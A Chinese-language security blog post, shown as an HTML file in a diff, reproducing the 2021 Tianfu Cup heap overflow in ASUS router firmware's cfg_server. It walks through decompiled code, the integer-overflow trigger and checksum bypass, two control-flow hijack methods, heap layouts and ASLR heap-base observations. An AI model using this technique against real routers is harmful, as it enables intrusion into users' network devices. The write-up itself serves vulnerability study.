@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"fxc233.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="前言漏洞分析大作业需要分析一个堆溢出，正好想起来21年天府杯攻破华硕所利用的堆溢出一直没有复现，于是就复现了一下，并记录于此。 环境准备我手里有华硕的一个真机，不过是TUF-AX5400，型号是3.0.0.4.386_46061。这个版本中堆溢出漏洞已被修复，并且官网也无法下载到这个系列的存在漏洞的旧版本，于是我对cfg_server进行了patch，使其可以正常走到漏洞点，上传至设备中手动启动。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021-TianFuCup-ASUS-HeapOverflow">
+<meta property="og:url" content="https://fxc233.github.io/2023/12/23/2021-TianFuCup-ASUS-HeapOverflow/index.html">
+<meta property="og:site_name" content="fxc233&#39;s blog">
+<meta property="og:description" content="前言漏洞分析大作业需要分析一个堆溢出，正好想起来21年天府杯攻破华硕所利用的堆溢出一直没有复现，于是就复现了一下，并记录于此。 环境准备我手里有华硕的一个真机，不过是TUF-AX5400，型号是3.0.0.4.386_46061。这个版本中堆溢出漏洞已被修复，并且官网也无法下载到这个系列的存在漏洞的旧版本，于是我对cfg_server进行了patch，使其可以正常走到漏洞点，上传至设备中手动启动。">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-12-23T14:12:00.000Z">
+<meta property="article:modified_time" content="2023-12-24T12:55:14.388Z">
+<meta property="article:author" content="fxc233">
+<meta property="article:tag" content="IOT">
+<meta property="article:tag" content="天府杯">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://fxc233.github.io/2023/12/23/2021-TianFuCup-ASUS-HeapOverflow/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>2021-TianFuCup-ASUS-HeapOverflow | fxc233's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">fxc233's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/fxc233" class="github-corner" title="fxc233 GitHub" aria-label="fxc233 GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fxc233.github.io/2023/12/23/2021-TianFuCup-ASUS-HeapOverflow/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="fxc233">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fxc233's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2021-TianFuCup-ASUS-HeapOverflow
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-12-23 22:12:00" itemprop="dateCreated datePublished" datetime="2023-12-23T22:12:00+08:00">2023-12-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-12-24 20:55:14" itemprop="dateModified" datetime="2023-12-24T20:55:14+08:00">2023-12-24</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>漏洞分析大作业需要分析一个堆溢出，正好想起来21年天府杯攻破华硕所利用的堆溢出一直没有复现，于是就复现了一下，并记录于此。</p>
+<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>我手里有华硕的一个真机，不过是<strong>TUF-AX5400</strong>，型号是<strong>3.0.0.4.386_46061</strong>。这个版本中堆溢出漏洞已被修复，并且官网也无法下载到这个系列的存在漏洞的旧版本，于是我对<strong>cfg_server</strong>进行了patch，使其可以正常走到漏洞点，上传至设备中手动启动。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞存在于<strong>cfg_server</strong>中，这个程序会监听<strong>7788</strong>端口。接收的数据包的格式类似TLV，即（Type-Length-Value），不过多了一个check字段来检查数据合法性。会根据<strong>Type</strong>，来选择相对应的处理函数。</p>
+<p>当<strong>Type</strong>为<strong>0x28</strong>时，会进入<strong>cm_processREQ_GROUPID</strong>函数，这个函数中存在如下调用链<strong>cm_packetProcess-&gt;aes_decrypt</strong>，来解密接收到的数据。整数溢出漏洞就出现在<strong>aes_decrypt</strong>中（当然也有很多其他Type所对应的函数会调用这个函数）。它的定义如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">aes_decrypt</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> a2, <span class="type">unsigned</span> <span class="type">int</span> length, _DWORD *a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  ctx = EVP_CIPHER_CTX_new();</span><br><span class="line">  <span class="keyword">if</span> ( !ctx )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s(%d):Failed to EVP_CIPHER_CTX_new() !!\n&quot;</span>, <span class="string">&quot;aes_decrypt&quot;</span>, <span class="number">768</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = EVP_aes_256_ecb();</span><br><span class="line">  v10 = (<span class="type">char</span> *)EVP_DecryptInit_ex(ctx, v9, <span class="number">0</span>, key, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    *a4 = <span class="number">0</span>;</span><br><span class="line">    v11 = EVP_CIPHER_CTX_block_size(ctx) + length;</span><br><span class="line">    v12 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(v11);</span><br><span class="line">    v10 = v12;</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memset</span>(v12, <span class="number">0</span>, v11);</span><br><span class="line">      out_data_ptr = v10;</span><br><span class="line">      <span class="keyword">for</span> ( i = length; ; i -= <span class="number">0x10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        in_data_ptr = a2 + length - i;</span><br><span class="line">        <span class="keyword">if</span> ( i &lt;= <span class="number">0x10</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !EVP_DecryptUpdate(ctx, out_data_ptr, tmp_out_len, in_data_ptr, <span class="number">16</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%s(%d):Failed to EVP_DecryptUpdate()!!\n&quot;</span>, <span class="string">&quot;aes_decrypt&quot;</span>, <span class="number">795</span>);</span><br><span class="line">          EVP_CIPHER_CTX_free(ctx);</span><br><span class="line">          <span class="built_in">free</span>(v10);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        out_data_ptr += tmp_out_len[<span class="number">0</span>];</span><br><span class="line">        *a4 += tmp_out_len[<span class="number">0</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !EVP_DecryptUpdate(ctx, out_data_ptr, tmp_out_len, in_data_ptr, i) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%s(%d):Failed to EVP_DecryptUpdate()!!\n&quot;</span>, <span class="string">&quot;aes_decrypt&quot;</span>, <span class="number">811</span>);</span><br><span class="line">          EVP_CIPHER_CTX_free(ctx);</span><br><span class="line">          <span class="built_in">free</span>(v10);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        out_data_ptr += tmp_out_len[<span class="number">0</span>];</span><br><span class="line">        *a4 += tmp_out_len[<span class="number">0</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !EVP_DecryptFinal_ex(ctx, out_data_ptr, tmp_out_len) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s(%d):Failed to EVP_DecryptFinal_ex()!!\n&quot;</span>, <span class="string">&quot;aes_decrypt&quot;</span>, <span class="number">822</span>);</span><br><span class="line">        EVP_CIPHER_CTX_free(ctx);</span><br><span class="line">        <span class="built_in">free</span>(v10);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      *a4 += tmp_out_len[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  EVP_CIPHER_CTX_free(ctx);</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先调用<strong>EVP_CIPHER_CTX_new</strong>为<strong>ctx</strong>结构体分配内存。下面就是对数据进行aes解密的过程。解密前会为数据分配内存，分配的大小是通过<strong>EVP_CIPHER_CTX_block_size(ctx) + length</strong>计算得出的，但是下面解密的时候循环次数又是由<strong>length</strong>控制。这里的<strong>length</strong>可以被我们控制，并且经过调试可以得知EVP_CIPHER_CTX_block_size(ctx)的值是0x10。如果我们控制<strong>length&#x3D;0xffffffff</strong>就可以导致整数溢出。使得<strong>malloc</strong>在分配一块较小内存的同时，会拷贝很长的数据到堆上，从而导致堆溢出。检查check字段合法性的函数定义如下。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __fastcall <span class="title function_">check</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> result, <span class="type">char</span> *a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// t1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( --a3 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = *a2++;</span><br><span class="line">    result = CRC32_Table[(<span class="type">unsigned</span> __int8)(v3 ^ result)] ^ (result &gt;&gt; <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们控制<strong>length&#x3D;0xffffffff</strong>，由于小于0，则会直接返回，也就是我们把<strong>check</strong>字段设置为0即可通过数据合法性检查。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>可以溢出那么就寻找结构体指针，尝试控制程序执行流。参考了<code>@CataLpa师傅</code>的<a target="_blank" rel="noopener" href="https://wzt.ac.cn/2021/11/02/TFC2021-AX56U/">文章</a>和<code>@CQ师傅</code>的<a target="_blank" rel="noopener" href="https://cq674350529.github.io/2023/08/05/Analyzing-the-Vulnerability-in-ASUS-Router-maybe-from-TFC2021/">文章</a>。知道了有这两个可以劫持的地方。</p>
+<p>首先看一下我们所涉及到的两个结构体：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">evp_cipher_ctx_st</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">const</span> EVP_CIPHER *cipher;</span><br><span class="line">    ENGINE *engine;   </span><br><span class="line">    <span class="type">int</span> encrypt;</span><br><span class="line">    <span class="type">int</span> buf_len;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> oiv[EVP_MAX_IV_LENGTH];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> iv[EVP_MAX_IV_LENGTH];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[EVP_MAX_BLOCK_LENGTH];</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    <span class="type">void</span> *app_data;</span><br><span class="line">    <span class="type">int</span> key_len;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    <span class="type">void</span> *cipher_data;</span><br><span class="line">    <span class="type">int</span> final_used;</span><br><span class="line">    <span class="type">int</span> block_mask;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> final[EVP_MAX_BLOCK_LENGTH];</span><br><span class="line">&#125; EVP_CIPHER_CTX; </span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">evp_cipher_st</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> nid;</span><br><span class="line">    <span class="type">int</span> block_size;</span><br><span class="line">    <span class="type">int</span> key_len;</span><br><span class="line">    <span class="type">int</span> iv_len;       </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    <span class="type">int</span> (*init)(EVP_CIPHER_CTX *ctx, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *key, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *iv, <span class="type">int</span> enc);</span><br><span class="line">    <span class="type">int</span> (*do_cipher)(EVP_CIPHER_CTX *ctx, <span class="type">unsigned</span> <span class="type">char</span> *out, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *in, <span class="type">unsigned</span> <span class="type">int</span> inl);</span><br><span class="line">    <span class="type">int</span> (*cleanup)(EVP_CIPHER_CTX *);</span><br><span class="line">    <span class="type">int</span> ctx_size;</span><br><span class="line">    <span class="type">int</span> (*set_asn1_parameters)(EVP_CIPHER_CTX *, ASN1_TYPE *);</span><br><span class="line">    <span class="type">int</span> (*get_asn1_parameters)(EVP_CIPHER_CTX *, ASN1_TYPE *);</span><br><span class="line">    <span class="type">int</span> (*ctrl)(EVP_CIPHER_CTX *, <span class="type">int</span> type, <span class="type">int</span> arg, <span class="type">void</span> *ptr);</span><br><span class="line">    <span class="type">void</span> *app_data;</span><br><span class="line">&#125;EVP_CIPHER; </span><br></pre></td></tr></table></figure>
+
+<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>一个是劫持<strong>EVP_CIPHER_CTX</strong>结构体中的<strong>cipher</strong>指针。在调用<strong>EVP_DecryptUpdate</strong>函数时，会调用<strong>cipher</strong>中的<strong>do_cipher</strong>来进行具体的解密。如果我们可以伪造一个<strong>EVP_CIPHER</strong>结构体，就可以实现控制程序的执行流。这个加密指针的调用伪代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v12 = *ctx;</span><br><span class="line">(*(<span class="type">int</span> (__fastcall **)(_DWORD *, <span class="type">char</span> *, <span class="type">char</span> *, <span class="type">int</span>))(v12 + <span class="number">0x18</span>))(ctx, out, in, in_len);</span><br></pre></td></tr></table></figure>
+
+<p>我们想要实现这样的劫持需要控制堆布局如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|   out_ptr    |</span><br><span class="line">|EVP_CIPHER_CTX|</span><br></pre></td></tr></table></figure>
+
+<p>也就是我们解密后存放的数据的缓冲区被分配在<strong>EVP_CIPHER_CTX</strong>结构体缓冲区之前，这样就可以覆盖<strong>EVP_CIPHER_CTX</strong>的<strong>cipher</strong>，实现对<strong>EVP_CIPHER</strong>的伪造，从而控制程序执行流。</p>
+<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>还有一个是劫持解密函数中所涉及的指针。方法一说到调用<strong>EVP_DecryptUpdate</strong>函数时，会调用<strong>cipher</strong>中的<strong>do_cipher</strong>来进行具体的解密。进一步调试可知<strong>do_cipher</strong>的伪代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">do_cipher</span><span class="params">(<span class="type">int</span> ctx, <span class="type">int</span> out, <span class="type">int</span> in, <span class="type">unsigned</span> <span class="type">int</span> in_len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> cipher_data; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v8 = EVP_CIPHER_CTX_block_size(ctx);</span><br><span class="line">  cipher_data = EVP_CIPHER_CTX_get_cipher_data(ctx);</span><br><span class="line">  <span class="keyword">if</span> ( v8 &lt;= in_len )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = in_len - v8;</span><br><span class="line">    v11 = cipher_data;</span><br><span class="line">    v12 = in;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v13 = v12;</span><br><span class="line">      v12 += v8;</span><br><span class="line">      (*(<span class="type">void</span> (__fastcall **)(<span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>))(v11 + <span class="number">0xF8</span>))(v13, out, v11);</span><br><span class="line">      out += v8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v10 &gt;= v12 - in );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">EVP_CIPHER_CTX_get_cipher_data</span><span class="params">(<span class="type">int</span> ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> *(_DWORD *)(ctx + <span class="number">0x60</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>显而易见，这是先获取了<strong>EVP_CIPHER_CTX</strong>结构体偏移为<strong>0x60</strong>地方的<strong>cipher_data</strong>指针（指向某个结构体，用来存放加解密相关数据）。再调用这个结构体偏移为<strong>0xF8</strong>处的函数指针<strong>AES_decrypt</strong>。经过调试可知，<strong>cipher_data</strong>指针总是指向我们的堆上。如果我们可以覆盖<strong>cipher_data</strong>指针偏移为<strong>0xF8</strong>处的函数指针<strong>AES_decrypt</strong>。那么也可以实现程序执行流的控制。</p>
+<p>我们想要实现这样的劫持需要控制堆布局如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">|   out_ptr    |</span><br><span class="line">|  cipher_data |</span><br><span class="line">|EVP_CIPHER_CTX|</span><br><span class="line">或</span><br><span class="line">|EVP_CIPHER_CTX|</span><br><span class="line">|   out_ptr    |</span><br><span class="line">|  cipher_data |</span><br></pre></td></tr></table></figure>
+
+<p>即我们不能破坏<strong>EVP_CIPHER_CTX</strong>结构体，以免无法调用<strong>cipher</strong>中的<strong>do_cipher</strong>，同时需要可以覆盖到<strong>AES_decrypt</strong>。</p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>我自己写exp的时候是尝试的第一种劫持方式。我构造出了如下布局：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► 0x1e6bc &lt;aes_decrypt+260&gt;  bl      #EVP_DecryptUpdate@plt     &lt;EVP_DecryptUpdate@plt&gt; </span><br><span class="line">        ctx: 0xb6500978 —▸ 0xb6e9bb1c ◂— 0x1aa</span><br><span class="line">        out: 0xb6500760 ◂— 0x0</span><br></pre></td></tr></table></figure>
+
+<p>这里值得一提的是，虽然开了aslr基地址会变化，但是经过我调试发现堆基地址大概率是0xb6300000，0xb6400000，0xb6500000。（可能因为是多线程的缘故，会为新线程准备一个堆基地址，这个地址变化不大）。我就把<strong>0xb6500760</strong>当作了<strong>EVP_CIPHER</strong>结构体的开头。之后覆盖<strong>EVP_CIPHER_CTX</strong>结构体中的<strong>cipher</strong>为<strong>0xb6500760</strong>即可。之后我又遇到了一个问题，就是在调用这个函数指针时，它的第一个参数是<strong>EVP_CIPHER_CTX</strong>结构体指针。由于我们每次只解密16字节，并且在覆盖<strong>cipher</strong>之后就无法继续解密，使得我这种布局只可以<strong>EVP_CIPHER_CTX</strong>结构体指针后面的控制4字节为我们想要执行的命令，这远远无法实现命令执行。经过替换gadget之后，最后也只构造出控制8字节的方式，可以勉强执行个<strong>reboot或者echo 1</strong>（:triumph:。</p>
